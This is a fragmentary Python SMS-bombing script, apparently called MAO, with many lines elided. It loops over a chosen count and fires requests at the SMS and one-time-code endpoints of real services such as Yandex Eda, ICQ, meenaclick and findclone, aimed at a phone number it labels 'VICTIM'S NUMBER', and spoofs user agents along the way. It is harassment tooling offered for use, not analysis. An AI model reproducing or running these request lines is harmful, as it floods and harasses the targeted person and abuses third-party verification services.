    ...
    while mao1<=maothreat:
      ...
      if maothreat <=2:
        ...
        if shajgoj.status_code==200:
          ...
          pass
      elif maothreat <=5 and maothreat>2:
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} {maocc}{maohungry}\n")
        ...
        if shajgoj.status_code==200:
          ...
          pass
      elif maothreat>5 and maothreat<=50:
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} {maocc}{maohungry}\n")
...
"Accept-Language": "en-US,en;q=0.9,bn;q=0.8",}
	...
	"params":{
        ...
        if hoicoi.status_code==200: 
          ...
          pass
      elif maothreat<=100 and maothreat>50:
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} {maocc}{maohungry}\n")
...
"Accept-Language": "en-US,en;q=0.9,bn;q=0.8",}
	...
	"params":{
        ...
        if icqnew.status_code==200: 
          ...
          pass
      elif maothreat<=250 and maothreat >100:
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} {maocc}{maohungry}\n")
...
"Accept-Language": "en-US,en;q=0.9,bn;q=0.8",}
	...
	"params":{
        ...
        if icqnew.status_code==200: 
          ...
          pass
      elif maothreat<=500 and maothreat>250:
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} {maocc}{maohungry}\n")
...
"Accept-Language": "en-US,en;q=0.9,bn;q=0.8",}
	...
	"params":{
        ...
        if pizzahut.status_code==200: 
          ...
          pass
        yandex=rpm('https://eda.yandex/api/v1/user/request_authentication_code', json={'phone_number': +maonumber3})
        if yandex.status_code==201: 
          osc("clear")
          print(logomao)
          print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
          print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} {maocc}{maohungry}\n")
        ...
        if bongobd.status_code==200: 
          ...
          pass
        icq=rpm('https://www.icq.com/smsreg/requestPhoneValidation.php', data={'msisdn': maonumber2, 'locale': 'en', 'countryCode': 'ru', 'version': '1', 'k': 'ic1rtwz1s1Hj1O0r', 'r': '46763'},headers={"User-Agent":maoagents})
...
"Accept-Language": "en-US,en;q=0.9,bn;q=0.8",}
	...
	"params":{
        ...
        if icqnew.status_code==200: 
          ...
          pass
      elif maothreat<=1000 and maothreat>500:
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} {maocc}{maohungry}\n")
...
"Cookie": "_ym_uid=1628529640459314054; _ym_d=1628529640; _ym_isad=2; _ym_visorc=w"}
        call=rgm("https://findclone.ru/register?phone="+maonumber3,headers=headerscall)
	...
	"params":{
       ...
       #
        ...
        if bioscope.status_code==200  : 
          ...
          pass
        meenaclick=rpm('https://api.meenaclick.com/api/front/sms/send/pin',json={"cell_phone":maonumber3,"type":"sign-up"},headers={"Accept" : "application/json, text/plain, */*",'Content-Type' : 'application/json',"User-Agent":maoagents})
        if meenaclick.status_code==200 : 
          osc("clear")
          print(logomao)
          print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
...
"Accept-Language": "en-US,en;q=0.9,bn;q=0.8",}
	...
	"params":{
        ...
        if pizzahut.status_code==200: 
          ...
          pass
        yandex=rpm('https://eda.yandex/api/v1/user/request_authentication_code', json={'phone_number': "+88"+maonumber})
        if yandex.status_code==201: 
          osc("clear")
          print(logomao)
          print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
